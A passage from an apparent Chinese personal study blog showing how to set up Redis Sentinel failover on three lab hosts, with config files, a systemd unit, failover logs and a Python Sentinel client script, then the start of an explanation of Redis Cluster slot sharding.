class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##基本命令行工具</span><br>firewall-cmd<br>firewall-cmd --add-port=80/tcp<br>firewall-cmd --add-port=8080/tcp <span class="hljs-comment">##添加8080端口的访问</span><br><br>firewall-cmd --reload <span class="hljs-comment">##重新加载新规则以生效</span><br><br>firewall --list-services <span class="hljs-comment">##列出服务</span><br>firewall --add-service=http <span class="hljs-comment">##添加http服务</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第八周</title>
    <link href="/2023/07/28/%E7%AC%AC%E5%85%AB%E5%91%A8/"/>
    <url>/2023/07/28/%E7%AC%AC%E5%85%AB%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-redis搭建哨兵原理和集群实现。"><a href="#1-redis搭建哨兵原理和集群实现。" class="headerlink" title="1. redis搭建哨兵原理和集群实现。"></a>1. redis搭建哨兵原理和集群实现。</h1><h1 id="redis哨兵机制实现（sentinel）"><a href="#redis哨兵机制实现（sentinel）" class="headerlink" title="redis哨兵机制实现（sentinel）"></a>redis哨兵机制实现（sentinel）</h1><p>类似MySQL的MHA功能，可以自动选主节点，实现自动故障转移failover，配合主从复制来实现，实现监控多个主从集群的心跳，故障转移</p><p>写操作：主节点</p><p>读操作：从节点，开启read-only参数</p><p>sentinel获取redis-server端的地址</p><p>sentinel作用：部署多个sentinel作为监控节点，内部也是有类似MHA的选举机制</p><p>1.类似MHA的故障转移管理节点，需要专门的服务器部署sentinel</p><p>2.代理节点，类似mycat的统一代理节点</p><p>3.客户端程序直接连接sentinel的节点IP工程</p><p><img src="2792175-20221210172433522-695245818.png" alt="img"><img src="2792175-20221210172434068-1959553824.png" alt="img"></p><p>故障转移流程：客户端直接连接sentinel节点，类似直连mycat</p><p>1.多个sentinel认为master节点有问题，可能通过心跳</p><p>2.sentinel选出slave作为master</p><p>3.其余的slave作为新的slave</p><p>4.客户端主从变化</p><p>5.修复坏的master</p><p>一般的分布式架构，类似ZK，sentinel，minio等节点部署，都是奇数个节点，且是大于等于3个节点的，有利于选举</p><p>集群的脑裂现象：偶数个：2个、4个的话，会出现选主平等的现象，无法决策出新的主</p><h2 id="sentinel内部的信息交换与健康检查"><a href="#sentinel内部的信息交换与健康检查" class="headerlink" title="sentinel内部的信息交换与健康检查"></a>sentinel内部的信息交换与健康检查</h2><p>定时Ping等，sentinel节点之间会互相检查等</p><p><img src="https://img2023.cnblogs.com/blog/2792175/202212/2792175-20221210172434479-390259734.png" alt="img"></p><h2 id="哨兵集群的部署"><a href="#哨兵集群的部署" class="headerlink" title="哨兵集群的部署"></a>哨兵集群的部署</h2><p>一般来说，哨兵软件是调用redis-sentinel的二进制执行文件，而这个文件的link恰好就是redis-server，其实本质上还是调用redis-server</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">[root@rocky ~]<span class="hljs-comment">#ll /apps/redis/bin/</span><br>总用量 24904<br>-rwxr-xr-x. 1 redis redis  6550296 10月  5 21:02 redis-benchmark<br>lrwxrwxrwx. 1 redis redis       12 10月  5 21:02 redis-check-aof -&gt; redis-server<br>lrwxrwxrwx. 1 redis redis       12 10月  5 21:02 redis-check-rdb -&gt; redis-server<br>-rwxr-xr-x. 1 redis redis  6766680 10月  5 21:02 redis-cli<br>lrwxrwxrwx. 1 redis redis       12 10月  5 21:02 redis-sentinel -&gt; redis-server<br>-rwxr-xr-x. 1 redis redis 12176040 10月  5 21:02 redis-server<br></code></pre></td></tr></table></figure><p>部署方式：同一台机器上，同时还是sentinel节点</p><p>最好是requirepass要一致，因为会触发sentinel机制选主</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##redis.conf密码一致</span><br>requirepass=123456<br><br>masterauth=123456<br>replicaof 10.0.0.132 6379<br><br><span class="hljs-comment">##db数量一致</span><br>databases 20<br><br>127.0.0.1:6379&gt; info replication<br><span class="hljs-comment"># Replication</span><br>role:master<br>connected_slaves:2<br>slave0:ip=10.0.0.128,port=6379,state=online,offset=25494,lag=1<br>slave1:ip=10.0.0.129,port=6379,state=online,offset=25494,lag=0<br>master_failover_state:no-failover<br>master_replid:a1ff530e12d9991340e8e46b6051009254dbffe4<br>master_replid2:0000000000000000000000000000000000000000<br>master_repl_offset:25494<br>second_repl_offset:-1<br>repl_backlog_active:1<br>repl_backlog_size:1048576<br>repl_backlog_first_byte_offset:1<br>repl_backlog_histlen:25494<br><br>127.0.0.1:6379&gt; dbsize<br>(<span class="hljs-built_in">integer</span>) 209<br><br>grep requirepass redis.conf<br><br><span class="hljs-comment">##密码一致，包括master节点也要，因为有可能称为slave</span><br>[root@slave1 etc]<span class="hljs-comment">#grep 123456 redis.conf</span><br>masterauth 123456<br>requirepass 123456<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;masterauth 123456&quot;</span> &gt;&gt; redis.conf<br>systemctl restart redis<br></code></pre></td></tr></table></figure><p><img src="2792175-20221210172434779-1388949979.png" alt="img"></p><h3 id="哨兵机制配置sentinel-conf"><a href="#哨兵机制配置sentinel-conf" class="headerlink" title="哨兵机制配置sentinel.conf"></a>哨兵机制配置sentinel.conf</h3><p>新建一个sentinel.conf文件，配置文件需要和目录名一致</p><p>复制到别的节点后，需要修改属主和属组，chown -R redis.redis /apps/redis，有报错的话就看日志，tail -f /apps/redis/log/sentinel.log</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /usr/local/src/redis-6.2.7/sentinel.conf<br><br><span class="hljs-comment">##主节点操作</span><br><span class="hljs-built_in">cp</span> /usr/local/src/redis-6.2.7/sentinel.conf /apps/redis/etc/<br><br><span class="hljs-comment">##修改权限，修改整个目录的权限，很重要</span><br><span class="hljs-built_in">chown</span> redis.redis sentinel.conf<br><br><span class="hljs-comment">##</span><br><span class="hljs-built_in">chown</span> redis. -R /apps/redis<br><br><span class="hljs-built_in">bind</span> 0.0.0.0 <span class="hljs-comment">##开启监听，这个sentinel服务默认不开的</span><br>port 26379 <span class="hljs-comment">##端口</span><br>daemonsize <span class="hljs-built_in">yes</span> <span class="hljs-comment">##后台执行</span><br>pidfile <span class="hljs-string">&quot;redis-sentinel.pid&quot;</span><br>logfile <span class="hljs-string">&quot;/apps/redis/log/sentinel.log&quot;</span><br><span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;/apps/redis/data&quot;</span> <span class="hljs-comment">##工作目录</span><br><br><span class="hljs-comment">##主节点IP+redis服务+有几个节点认为挂了就是挂了，集群名称</span><br>sentinel monitor mymaster 10.0.0.132 6379 2<br>sentinel auth-pass mymaster 123456<br><br><span class="hljs-comment">##集群master密码</span><br>sentinel auth-pass mymaster 123456<br><br><span class="hljs-comment">##默认是master在30s后无响应，则认为是down掉了，可以配置为3s</span><br>sentinel down-after-milliseconds mymaster 30000<br>sentinel down-after-milliseconds mymaster 3000<br><br><span class="hljs-comment">##其余默认即可</span><br><span class="hljs-comment">##重新选主后可以同时同步的节点数：1个，即最多有一个slave和新主进行同步，避免造成大量的流量</span><br>sentinel parallel-syncs mymaster 1<br><br><span class="hljs-comment">##rsync保存属性，复制到其他两个从节点上</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 128 129;<span class="hljs-keyword">do</span> scp -p  /apps/redis/etc/sentinel.conf 10.0.0.<span class="hljs-variable">$i</span>:/apps/redis/etc/;<span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">chown</span> redis.redis /apps/redis/etc/sentinel.conf<br></code></pre></td></tr></table></figure><h3 id="redis-sentinel的service文件"><a href="#redis-sentinel的service文件" class="headerlink" title="redis-sentinel的service文件"></a>redis-sentinel的service文件</h3><p>调用redis-sentinel的二进制执行文件，有报错就看日志，之前尝试过fail start的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt; /lib/systemd/system/redis-sentinel.service &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[Unit]</span><br><span class="hljs-string">Description=Redis sentinel</span><br><span class="hljs-string">After=network.target</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Service]</span><br><span class="hljs-string">ExecStart=/apps/redis/bin/redis-sentinel /apps/redis/etc/sentinel.conf --supervised systemd</span><br><span class="hljs-string">ExecStop=/bin/kill -s QUIT \$MAINPID</span><br><span class="hljs-string">Type=notify</span><br><span class="hljs-string">User=redis</span><br><span class="hljs-string">Group=redis</span><br><span class="hljs-string">RuntimeDirectory=redis</span><br><span class="hljs-string">RuntimeDirectoryMode=0755</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Install]</span><br><span class="hljs-string">WantedBy=multi-user.target</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment">##启动哨兵服务</span><br>systemctl daemon-reload<br>systemctl restart redis-sentinel.service<br>systemctl <span class="hljs-built_in">enable</span> --now redis-sentinel.service<br><br>systemctl <span class="hljs-built_in">disable</span> --now redis_6380.service<br><br>[root@rocky redis]<span class="hljs-comment">#ss -ntlp | grep redis</span><br>LISTEN 0      511          0.0.0.0:26379      0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-sentinel&quot;</span>,pid=6143,fd=6))                 <br>LISTEN 0      511          0.0.0.0:6379       0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=5904,fd=6))                   <br>LISTEN 0      511            [::1]:6379          [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=5904,fd=7)) <br><br><span class="hljs-comment">##rsync保存属性，复制到其他两个从节点上</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 128 129;<span class="hljs-keyword">do</span> scp -p /usr/lib/systemd/system/redis-sentinel.service 10.0.0.<span class="hljs-variable">$i</span>:/usr/lib/systemd/system/;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="查看sentinel服务的状态，sentinel-3才正常，因为有3个sentinel节点"><a href="#查看sentinel服务的状态，sentinel-3才正常，因为有3个sentinel节点" class="headerlink" title="查看sentinel服务的状态，sentinel=3才正常，因为有3个sentinel节点"></a>查看sentinel服务的状态，sentinel=3才正常，因为有3个sentinel节点</h3><p>info sentinel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">ss -ntlp | grep 26379<br>[root@slave1 etc]<span class="hljs-comment">#ss -ntlp | grep 6379</span><br>LISTEN     0      511          *:26379                    *:*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-sentinel&quot;</span>,pid=67801,fd=6))<br>LISTEN     0      511          *:6379                     *:*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=35048,fd=6))<br>LISTEN     0      511        ::1:6379                    :::*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=35048,fd=7))<br><br><span class="hljs-comment">##手动执行</span><br>/apps/redis/bin/redis-sentinel /apps/redis/etc/sentinel.conf<br><br><span class="hljs-comment">##连接sentinel</span><br><span class="hljs-comment">##sentinel的状态只有1个，有点问题</span><br>[root@rocky ~]<span class="hljs-comment">#redis-cli -p 26379</span><br>127.0.0.1:26379&gt; info sentinel<br><span class="hljs-comment"># Sentinel</span><br>sentinel_masters:1<br>sentinel_tilt:0<br>sentinel_running_scripts:0<br>sentinel_scripts_queue_length:0<br>sentinel_simulate_failure_flags:0<br>master0:name=mymaster,status=ok,address=10.0.0.132:6379,slaves=2,sentinels=1<br><br><span class="hljs-comment">#查看slave，原来是myid相同，主节点起了之后才复制过来的，重新复制sentinel.conf模板文件</span><br><span class="hljs-built_in">cp</span> /usr/local/src/redis-6.2.7/sentinel.conf /apps/redis/etc/<br><br>systemctl restart redis-sentinel<br><br>看到myid不同才行<br>protected-mode no<br>supervised systemd<br>user default on nopass ~* &amp;* +@all<br>sentinel myid 7bf113db0a86b005517e5695ca845a91fcf92236<br>sentinel config-epoch mymaster 0<br>sentinel leader-epoch mymaster 0<br>sentinel current-epoch 0<br>sentinel known-replica mymaster 10.0.0.129 6379<br>sentinel known-replica mymaster 10.0.0.128 6379<br>sentinel known-sentinel mymaster 10.0.0.132 26379 f617e11afbdc62e7079af265aa7f5b0de1448316<br><br>protected-mode no<br>supervised systemd<br>maxclients 4064<br>user default on nopass ~* &amp;* +@all<br>sentinel myid eeedca70986055851c7bb6ffedb66408968ebff8<br>sentinel config-epoch mymaster 0<br>sentinel leader-epoch mymaster 0<br>sentinel current-epoch 0<br>sentinel known-replica mymaster 10.0.0.129 6379<br>sentinel known-replica mymaster 10.0.0.128 6379<br>sentinel known-sentinel mymaster 10.0.0.132 26379 f617e11afbdc62e7079af265aa7f5b0de1448316<br>sentinel known-sentinel mymaster 10.0.0.128 26379 7bf113db0a86b005517e5695ca845a91fcf92236<br><br>127.0.0.1:26379&gt; info sentinel<br><span class="hljs-comment"># Sentinel</span><br>sentinel_masters:1<br>sentinel_tilt:0<br>sentinel_running_scripts:0<br>sentinel_scripts_queue_length:0<br>sentinel_simulate_failure_flags:0<br>master0:name=mymaster,status=ok,address=10.0.0.132:6379,slaves=2,sentinels=3 ---&gt;sentinels为3才行<br></code></pre></td></tr></table></figure><h2 id="通过sentinel实现故障转移"><a href="#通过sentinel实现故障转移" class="headerlink" title="通过sentinel实现故障转移"></a>通过sentinel实现故障转移</h2><p>一定要在sentinel监听到redis节点有故障挂了才行，sentinel内会自动选举</p><p>PS：主节点服务挂了，踢出sentinel集群后，如果再重启机器，会重新加载配置文件加入到集群中，则新master会重新拷贝RDB文件到从节点，会变得非常卡机器，老的master修复好服务后就启动成新节点了</p><p>会自动修改redis.conf，指向新的主</p><p>复制风暴：如果有很多记录的话，则会复制全量到修复好的slave节点，从而造成CPU非常高</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##停止master节点，看看会不会起新的master，踢出集群</span><br>systemctl stop redis<br><span class="hljs-built_in">tail</span> -f /apps/redis/log/sentinel.log<br>15621:X 26 Oct 2022 21:38:44.781 * +sentinel-address-switch master mymaster 10.0.0.132 6379 ip 10.0.0.132 port 26379 <span class="hljs-keyword">for</span> f617e11afbdc62e7079af265aa7f5b0de1448316<br>15621:X 26 Oct 2022 21:38:47.574 * +sentinel sentinel eeedca70986055851c7bb6ffedb66408968ebff8 10.0.0.129 26379 @ mymaster 10.0.0.132 6379<br><br>或者是<br>sentinel failover测试环境<br><br><span class="hljs-comment">##sentinel内选举新主，129机器的sentinel日志也显示了</span><br>15621:X 26 Oct 2022 22:13:08.576 <span class="hljs-comment"># +vote-for-leader 7bf113db0a86b005517e5695ca845a91fcf92236 1</span><br><br><span class="hljs-comment">##128变为新主</span><br>15621:X 26 Oct 2022 22:13:10.481 <span class="hljs-comment"># +switch-master mymaster 10.0.0.132 6379 10.0.0.128 6379</span><br><br><span class="hljs-comment">##128机器查看，变为主了，同时会自动修改redis.conf文件，指向128（redis主节点）</span><br>[root@master ~]<span class="hljs-comment">#redis-cli -a 123456</span><br>127.0.0.1:6379&gt; info replication<br><span class="hljs-comment"># Replication</span><br>role:master<br>connected_slaves:1<br>slave0:ip=10.0.0.129,port=6379,state=online,offset=724645,lag=0<br>master_failover_state:no-failover<br>master_replid:092d02084ede344500d29ba82cc42de4a13071c2<br>master_replid2:ade1fc5d85f404277aced0fd10e05d96ef104f9b<br>master_repl_offset:724915<br>second_repl_offset:696752<br>repl_backlog_active:1<br>repl_backlog_size:1048576<br>repl_backlog_first_byte_offset:159<br>repl_backlog_histlen:724757<br><br>129应该是备<br>127.0.0.1:6379&gt; info replication<br><span class="hljs-comment"># Replication</span><br>role:slave<br>master_host:10.0.0.128<br><br><br><span class="hljs-comment">##重启132节点的redis服务</span><br>127.0.0.1:6379&gt; dbsize<br>(<span class="hljs-built_in">integer</span>) 209<br><br>127.0.0.1:6379&gt; info replication<br><span class="hljs-comment"># Replication</span><br>role:slave<br>master_host:10.0.0.128<br>master_port:6379<br><br><br><span class="hljs-comment">##节点优先级</span><br>replica-priority 100 ---&gt;值越小优先级越高<br></code></pre></td></tr></table></figure><h1 id="python写sentinel节点"><a href="#python写sentinel节点" class="headerlink" title="python写sentinel节点"></a>python写sentinel节点</h1><p>redis主从集群部署了sentinel后，连接不能是redis的master节点IP（写死IP）了，需要连接到sentinel的节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##role查看角色</span><br>127.0.0.1:6379&gt; role<br>1) <span class="hljs-string">&quot;slave&quot;</span><br>2) <span class="hljs-string">&quot;10.0.0.128&quot;</span><br><br><span class="hljs-comment">##128故障切换，配置redis的priority 50</span><br>replica-priority 50<br>systemctl restart redis<br><br><span class="hljs-comment">##切换，需要加上redis-sentinel的集群名称：mymaster，已经切换到132节点了</span><br>127.0.0.1:26379&gt; sentinel failover mymaster<br>OK<br><br>15621:X 26 Oct 2022 23:19:36.916 <span class="hljs-comment"># +switch-master mymaster 10.0.0.128 6379 10.0.0.132 6379</span><br>15621:X 26 Oct 2022 23:19:36.916 * +slave slave 10.0.0.129:6379 10.0.0.129 6379 @ mymaster 10.0.0.132 6379<br>15621:X 26 Oct 2022 23:19:36.916 * +slave slave 10.0.0.128:6379 10.0.0.128 6379 @ mymaster 10.0.0.132 6379<br><br>127.0.0.1:6379&gt; role<br>1) <span class="hljs-string">&quot;master&quot;</span><br>2) (<span class="hljs-built_in">integer</span>) 1516302<br>3) 1) 1) <span class="hljs-string">&quot;10.0.0.129&quot;</span><br></code></pre></td></tr></table></figure><p>连接的python脚本（自动判断主从redis节点），导入sentinel库来判断，写sentinel的端口号</p><p>直接写sentinel的地址+端口号，通过sentinel绑定了redis的主从节点，自动判断redis内的节点，其实get方法是直接连mymaster（sentinel集群的名称）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">from</span> redis.sentinel <span class="hljs-keyword">import</span> Sentinel<br><br><span class="hljs-comment">#连接哨兵服务器(主机名也可以用域名),写一个数组赋值，不需要认为去判断那个redis为主</span><br>sentinel = Sentinel([(<span class="hljs-string">&#x27;10.0.0.128&#x27;</span>, <span class="hljs-number">26379</span>),<br>                     (<span class="hljs-string">&#x27;10.0.0.129&#x27;</span>, <span class="hljs-number">26379</span>),<br>                     (<span class="hljs-string">&#x27;10.0.0.132&#x27;</span>, <span class="hljs-number">26379</span>)<br>                    ],<br>                    socket_timeout=<span class="hljs-number">0.5</span>)<br><br><span class="hljs-comment">##redis认证密码</span><br>redis_auth_pass=<span class="hljs-string">&#x27;123456&#x27;</span><br><br><span class="hljs-comment">#mymaster 是运维人员配置哨兵模式的数据库名称，实际名称按照个人部署案例来填写</span><br><span class="hljs-comment">#获取主服务器地址</span><br>master = sentinel.discover_master(<span class="hljs-string">&#x27;mymaster&#x27;</span>)<br><span class="hljs-built_in">print</span>(master)<br><br><br><span class="hljs-comment">#获取从服务器地址</span><br>slave = sentinel.discover_slaves(<span class="hljs-string">&#x27;mymaster&#x27;</span>)<br><span class="hljs-built_in">print</span>(slave)<br><br><span class="hljs-comment">##两种方法分别是master节点的get、set和slave节点的get</span><br><span class="hljs-comment">#获取主服务器进行写入</span><br>master = sentinel.master_for(<span class="hljs-string">&#x27;mymaster&#x27;</span>, socket_timeout=<span class="hljs-number">0.5</span>, password=redis_auth_pass, db=<span class="hljs-number">0</span>)<br>w_ret = master.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;wang&#x27;</span>)<br><span class="hljs-comment">#输出：True</span><br><br><span class="hljs-comment">#获取从服务器进行读取（默认是round-roubin）</span><br>slave = sentinel.slave_for(<span class="hljs-string">&#x27;mymaster&#x27;</span>, socket_timeout=<span class="hljs-number">0.5</span>, password=redis_auth_pass, db=<span class="hljs-number">0</span>)<br>r_ret = slave.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br><span class="hljs-built_in">print</span>(r_ret)<br><span class="hljs-comment">#输出：wang</span><br><br>-----<br><span class="hljs-comment">##执行python脚本，打印出主节点的IP和从节点的IP，调用方法即可</span><br><span class="hljs-number">132</span>：redis主节点<br><span class="hljs-number">129</span>：redis从节点<br>打印出wang，是name的值<br>[root@rocky script]<span class="hljs-comment">#./sentinel_test.py </span><br>(<span class="hljs-string">&#x27;10.0.0.132&#x27;</span>, <span class="hljs-number">6379</span>)<br>[(<span class="hljs-string">&#x27;10.0.0.129&#x27;</span>, <span class="hljs-number">6379</span>), (<span class="hljs-string">&#x27;10.0.0.128&#x27;</span>, <span class="hljs-number">6379</span>)]<br><span class="hljs-string">b&#x27;wang&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="redis集群cluster的实现"><a href="#redis集群cluster的实现" class="headerlink" title="redis集群cluster的实现"></a>redis集群cluster的实现</h1><p>redis无论是配置了sentinel进行故障转移，始终还是redis单节点完成写操作，还是有性能瓶颈，分部署redis方案；</p><p>redis的搭建模式</p><p>1.普通的主从模式，1主多从</p><p>2.redis集群模式，cluster模式，3个节点都是master节点，各自有从节点，至少需要3节点</p><p><img src="2792175-20221210172435109-1535148833.png" alt="img"></p><p>cluster实现原理：将三个master节点分成16384个槽位，然后/3来放置，对来的key取模，得到哪个就放在哪个对应的机器上面</p><p>分布式的存放数据，实现高可用</p><p>1.解决单点故障的问题</p><p>2.主从架构的话，所有的数据都是存放在主节点，由主节点同步到从节点，数据始终是只有一份的，现在部署cluster的话，则数据存放是多份的</p><p>3.多个master同时工作，虽然都是单线程接受请求，但是性能上也会提升很多</p><p>4.slot只是一个槽位，但是不影响他放数据，数据还是存放在内存中，根据rbd文件来实现数据的持久化，数据可以放N多个，dbsize来看</p><p>5.redis数据使用量：看rdb文件，如果是自建的redis，则占用磁盘用量；网络上购买的redis，则使用内存的数据大小，都是缓存，buffer，读数据才快</p><p>程序对接：需要写上cluster所有节点的IP地址，包括3个master和N个slave节点</p><h2 id="cluster实现逻辑"><a href="#cluster实现逻辑" class="headerlink" title="cluster实现逻辑"></a>cluster实现逻辑</h2><p>key—CRC算法—在对16384取模—得到一个值就放在对应的redis节点上</p><p>不同的Node槽位号不同</p><p><img src="2792175-20221210172435486-285491561.png" alt="img"></p><h2 id="cluster集群部署最佳实践"><a href="#cluster集群部署最佳实践" class="headerlink" title="cluster集群部署最佳实践"></a>cluster集群部署最佳实践</h2><p>测试环境：可以部署三节点，每个节点起两个实例，同时主从关系错开部署，避免主从节点在同一台机器上</p><p>生产环境：建议部署6台redis机器，做主从，方便容灾，故障转移failover</p><p>分片数：指的是节点中的对于所有槽位的分片吧</p><p><img src="2792175-20221210172435808-26218978.png" alt="img"></p><h2 id="部署cluster集群"><a href="#部署cluster集群" class="headerlink" title="部署cluster集群"></a>部署cluster集群</h2><p>xshell快速命令栏—撰写窗格—全部会话—执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 